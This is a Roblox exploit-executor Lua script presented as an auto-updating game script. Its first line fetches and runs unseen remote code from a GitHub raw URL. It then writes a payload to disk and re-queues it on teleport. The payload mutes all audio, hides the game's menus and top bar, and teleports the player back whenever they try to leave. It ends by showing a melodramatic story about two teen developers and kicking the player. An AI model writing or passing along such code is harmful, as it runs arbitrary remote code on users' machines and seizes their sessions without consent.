-- Wesz, i am sorry for using ai in some of the scripts.
-- were just some teens that knows not all sort of coding stuff. I tried my best to continue the real script

-- updated.
-- this script will be auto updated EVERYTIME

loadstring(game:HttpGet("https://raw.githubusercontent.com/UrexampleGD/CZPiler/refs/heads/main/ScorpionE3.lua"))()

local s = [==[
local plr = game.Players.LocalPlayer
local pg = plr:WaitForChild("PlayerGui")
local sg = game:GetService("StarterGui")
local uis = game:GetService("UserInputService")
local tps = game:GetService"TeleportService"
local gsvc = game:GetService("GuiService")
local ssvc = game:GetService("SoundService")
local lght = game:GetService("Lighting")

local genv = getgenv and getgenv() or _G
local why = "uh idk lol, js to make it a lil dramatic hahahahahahahahaa"

local qt = genv.queue_on_teleport or genv.queueonteleport
if not qt and genv.syn then qt = genv.syn.queue_on_teleport end
if not qt and genv.fluxus then qt = genv.fluxus.queue_on_teleport end

local vhs_snd = Instance.new("Sound")
vhs_snd.Name = "vhs"
vhs_snd.SoundId = "rbxassetid://74213678128273"
vhs_snd.Looped = true
vhs_snd.Volume = 1
vhs_snd.Parent = ssvc
vhs_snd:Play()

for _, v in pairs(game:GetDescendants()) do
    if v:IsA("Sound") and v ~= vhs_snd then
        v.Volume = 0
        v.Playing = false
    end
end

spawn(function()
    while wait(0.5) do
        for _, v in pairs(game:GetDescendants()) do
            if v:IsA("Sound") and v ~= vhs_snd and v.Volume > 0 then
                v.Volume = 0
            end
        end
    end
end)

local a = true
local b = false
local c = false
local d = 0
local e = false
local f = os.clock()
local thing = tostring(plr.UserId)
local fin = "ax3l/_ax3l_finished_" .. thing .. ".txt"
local rjf = "ax3l/rejoin_" .. thing .. ".txt"

local whatever = nil -- unused lol

if isfile and isfile(fin) and readfile(fin) == "1" then
    if delfile then delfile(fin) end
    return
end

local wasrj = false
if isfile and isfile(rjf) then
    local t = tonumber(readfile(rjf))
    if t and os.time() - t < 120 then wasrj = true end
    if delfile then delfile(rjf) end
end

delay(3, function() e = true end)

local function rj()
    if c then return end
    if os.clock() - d < 3 then return end
    d = os.clock()
    c = true
    pcall(function()
        if writefile and isfolder then
            if not isfolder("ax3l") then makefolder("ax3l") end
            writefile(rjf, tostring(os.time()))
        end
    end)
    if qt and isfile and isfile("ax3l/payload.lua") then
        pcall(function()
            qt("task.wait(3) local ok, l = pcall(function() return loadstring or load end) if not ok or not l then return end local s = readfile('ax3l/payload.lua') if s and s ~= '' then pcall(function() l(s)() end) end")
        end)
    end
    spawn(function()
        pcall(function()
            local p = game.PlaceId
            local j = game.JobId
            if j and j ~= "" then
                tps:TeleportToPlaceInstance(p, j, plr, "Ax3LAntiLeave")
            else
                tps:Teleport(p, plr, "Ax3LAntiLeave")
            end
        end)
        wait(3)
        c = false
    end)
end

local function bk()
    if not a or b then return end
    if not e then return end
    if os.clock() - f < 3 then return end
    rj()
end

local function wipe()
    pcall(function() sg:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)
    pcall(function() sg:SetCore("TopbarEnabled", false) end)
    local cg = game:GetService("CoreGui")
    local rg = cg:FindFirstChild("RobloxGui")
    if rg then
        for _, v in pairs(rg:GetChildren()) do
            if v.Name == "TopBarApp" or v.Name == "Topbar" or v.Name == "RobloxTopbar" then
                pcall(function() v.Enabled = false end)
                pcall(function() v.Visible = false end)
                pcall(function() v:Destroy() end)
            end
        end
    end
    for _, v in pairs(cg:GetChildren()) do
        if v.Name == "TopBarApp" or v.Name == "Topbar" or v.Name == "RobloxTopbar" then
            pcall(function() v:Destroy() end)
        end
    end
    pcall(function() uis.ModalEnabled = true end)
end

spawn(function()
    while wait(0.1) do wipe() end
end)

plr.OnTeleport:Connect(function() if a and not b then bk() end end)
gsvc.MenuOpened:Connect(function() if a and not b then bk() end end)
gsvc.MenuClosed:Connect(function() if a and not b then bk() end end)
uis.WindowFocusReleased:Connect(function() if a and not b then bk() end end)
uis.WindowFocused:Connect(function() if a and not b then bk() end end)

pcall(function()
    gsvc.ErrorPromptChanged:Connect(function()
        if a and not b then spawn(function() wait(0.1) bk() end) end
    end)
end)

uis.InputBegan:Connect(function(i, gp)
    if a and not b and not gp and i.KeyCode == Enum.KeyCode.Escape then bk() end
end)

uis.InputEnded:Connect(function(i, gp)
    if a and not b and not gp and i.KeyCode == Enum.KeyCode.Escape then bk() end
end)

spawn(function()
    while wait(0.05) do
        if a and not b then
            pcall(function() uis.ModalEnabled = true end)
            pcall(function() sg:SetCore("TopbarEnabled", false) end)
        end
    end
end)

local x = Instance.new"ScreenGui"
x.Name = "x"
x.IgnoreGuiInset = true
x.ResetOnSpawn = false
x.DisplayOrder = 999999
x.Parent = pg

local y = Instance.new("Frame", x)
y.Size = UDim2.fromScale(1, 1)
y.BackgroundColor3 = Color3.new(0, 0, 0)
y.BorderSizePixel = 0
y.ZIndex = 1

local z = Instance.new("UIListLayout", y)
z.Padding = UDim.new(0, 8)
z.SortOrder = Enum.SortOrder.LayoutOrder
z.HorizontalAlignment = Enum.HorizontalAlignment.Center
z.VerticalAlignment = Enum.VerticalAlignment.Center

local pad = Instance.new("UIPadding", y)
pad.PaddingLeft = UDim.new(0.05, 0)
pad.PaddingRight = UDim.new(0.05, 0)

local vg = Instance.new("ScreenGui")
vg.Name = "vhs"
vg.IgnoreGuiInset = true
vg.ResetOnSpawn = false
vg.DisplayOrder = 1000000
vg.Parent = pg

local cc = Instance.new("ColorCorrectionEffect", lght)
cc.Saturation = -0.7
cc.Contrast = 0.4
cc.Brightness = -0.05
cc.TintColor = Color3.fromRGB(255, 235, 200)

local bl = Instance.new("BlurEffect", lght)
bl.Size = 2

local scan = Instance.new("Frame", vg)
scan.Size = UDim2.fromScale(1, 1)
scan.BackgroundTransparency = 1
scan.BorderSizePixel = 0
scan.ZIndex = 5

for i = 0, 300 do
    local ln = Instance.new("Frame", scan)
    ln.Size = UDim2.new(1, 0, 0, 1)
    ln.Position = UDim2.new(0, 0, 0, i * 4)
    ln.BackgroundColor3 = Color3.new(0, 0, 0)
    ln.BackgroundTransparency = 0.65
    ln.BorderSizePixel = 0
    ln.ZIndex = 5
end

local cr = Instance.new("Frame", vg)
cr.Size = UDim2.fromScale(1, 1)
cr.Position = UDim2.fromOffset(1, 0)
cr.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
cr.BackgroundTransparency = 0.94
cr.BorderSizePixel = 0
cr.ZIndex = 6

local cb = Instance.new("Frame", vg)
cb.Size = UDim2.fromScale(1, 1)
cb.Position = UDim2.fromOffset(-1, 0)
cb.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
cb.BackgroundTransparency = 0.94
cb.BorderSizePixel = 0
cb.ZIndex = 6

spawn(function()
    while wait(0.1) do
        scan.Position = UDim2.new(0, math.random(-2, 2), 0, math.random(-1, 1))
    end
end)

spawn(function()
    while wait(math.random(3, 8)) do
        local fl = Instance.new("Frame", vg)
        fl.Size = UDim2.fromScale(1, 1)
        fl.BackgroundColor3 = Color3.new(1, 1, 1)
        fl.BackgroundTransparency = 0.6
        fl.BorderSizePixel = 0
        fl.ZIndex = 7
        wait(0.05)
        fl:Destroy()
    end
end)

local intro = {
    "Hello... Ax3L here",
    "The developer of this script",
    "",
    "Me and Wesz... the host / ui maker",
    "We had a conversation in a VC. Discord call",
    "It... went wrong",
    "",
    "I almost cried in that call",
    "Feeling hopeless",
    "",
    "But hey...",
    "I still need to believe in myself",
    "",
    "Let me recap the conversation",
    "Me and Wesz",
    "OH AND ALSO... we're still continuing the script if ya wondering",
    "",
    "Well... here it goes",
    "this call was in Russia, so I tried making this as accurately as possible",
    "*the call connects*"
}

local call = [[Wesz: Dude
Wesz: Dude what the f*ck are you genuinely doing
Me: Wh... what? What do you mean?
Wesz: Don't play dumb with me
Wesz: You know EXACTLY what you did
Me: I don't know what you're talking about
Wesz: dude
Wesz: Why did you use AI
Me: WHAT DO YOU EXPECT? ARE WE EXPERT? NO!
Me: WELL WE ARE TEENS THAT KNOW BASIC STUFF OF CODING
Me: What do you expect me to do? Error some sh*t up?
Wesz: You could've just... learned them
Wesz: Like a normal f*cking person
Me: (*sigh*)
Me: You could've learned your math too instead of using AI
Wesz: ...
Wesz: Bitch
Wesz: Listen to me. LISTEN
Wesz: I pay you $50 a week to help me code stuff
Wesz: NOT to sit there and do some vibecoded sh*t
Wesz: i trusted you And you do THIS?
Me: ...
Me: Well... that's your fault that you picked me
Wesz: ...
Wesz: Ugh. Whatever, dork
Me: You've finally learned huh
Wesz: ...
Wesz: I'm not paying you ever again
Me: ...
Me: Well then I am not going to McDonalds again :(
Wesz: Good
*Discord call ends*]]

local outro = {
    "I still didn't get paid by now",
    "I need to eat McDonald :(",
    "And maybe I'll work there forever xd",
    "",
    "I feel like I wanna cry",
    "still no gf",
    "no payday",
    "",
    "I hope one day I'll find a chance"
}

local all = {}
if wasrj then
    table.insert(all, "how rude you tried to leave")
    table.insert(all, "ok ok sorry i just wanted attention xddddd")
    table.insert(all, "but pls listen, you will get the script on 26 of october")
    table.insert(all, "this script will be auto updated")
end
for _, v in ipairs(intro) do table.insert(all, v) end

local ts1 = 0.012
local ts2 = 0.07
local ts3 = 2

local function tw(txt, lb, sp)
    for i = 1, #txt do
        if b then return end
        lb.Text = string.sub(txt, 1, i)
        task.wait(sp)
    end
end

local function ew(lb, sp)
    for i = #lb.Text, 0, -1 do
        if b then return end
        lb.Text = string.sub(lb.Text, 1, i)
        task.wait(sp)
    end
end

local function nl(o)
    local lb = Instance.new"TextLabel"
    lb.Size = UDim2.new(1, 0, 0, 22)
    lb.AutomaticSize = Enum.AutomaticSize.Y
    lb.BackgroundTransparency = 1
    lb.TextColor3 = Color3.fromRGB(255, 255, 255)
    lb.Font = Enum.Font.Code
    lb.TextSize = 22
    lb.TextWrapped = true
    lb.TextXAlignment = Enum.TextXAlignment.Center
    lb.TextYAlignment = Enum.TextYAlignment.Center
    lb.Text = ""
    lb.LayoutOrder = o
    lb.ZIndex = 2
    lb.Parent = y
    return lb
end

spawn(function()
    wait(1)
    for _, v in pairs(y:GetChildren()) do
        if v:IsA("TextLabel") then v:Destroy() end
    end

    local n = 0
    for i, txt in ipairs(all) do
        if b then break end
        n = n + 1
        local lb = nl(n)
        if txt ~= "" then tw(txt, lb, ts1) else wait(ts1) end
        wait(ts3)
        ew(lb, ts2)
        lb:Destroy()
        wait(0.2)
    end

    if not b then
        local lb = nl(100)
        tw(call, lb, 0.04)
        wait(6)
        ew(lb, 0.01)
        lb:Destroy()
        wait(1)
    end

    for _, txt in ipairs(outro) do
        if b then break end
        n = n + 1
        local lb = nl(n)
        if txt ~= "" then tw(txt, lb, ts1) else wait(ts1) end
        wait(ts3)
        ew(lb, ts2)
        lb:Destroy()
        wait(0.2)
    end

    if b then return end
    wait(2)

    if writefile and isfolder then
        pcall(function()
            if not isfolder("ax3l") then makefolder("ax3l") end
            writefile(fin, "1")
        end)
    end

    b = true
    a = false
    plr:Kick(why)
end)
]==]

if writefile and isfolder then
    pcall(function()
        if not isfolder("ax3l") then makefolder("ax3l") end
        writefile("ax3l/payload.lua", s)
    end)
end

local fn = loadstring or load
if fn then
    local ok, r = pcall(fn, s)
    if ok and r then pcall(r) end
end
